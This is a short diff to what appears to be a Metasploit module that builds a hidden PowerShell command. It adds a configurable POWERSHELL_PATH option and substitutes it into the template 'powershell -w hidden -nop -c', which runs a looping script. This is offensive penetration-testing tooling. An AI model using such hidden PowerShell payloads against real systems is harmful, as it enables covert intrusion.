@@ -38,6 +38,9 @@ module MetasploitModule
           'Payload' => ''
         }
       ))
+    register_options([
+      OptString.new('POWERSHELL_PATH', [true, 'The Path to Powershell', 'powershell']),
+    ])
   end
 
   #
@@ -107,6 +110,6 @@ while ($true) {
 }
 ^.gsub!("\n", "")
 
-    "powershell -w hidden -nop -c #{powershell}"
+    "#{datastore['POWERSHELL_PATH']} -w hidden -nop -c #{powershell}"
   end
 end
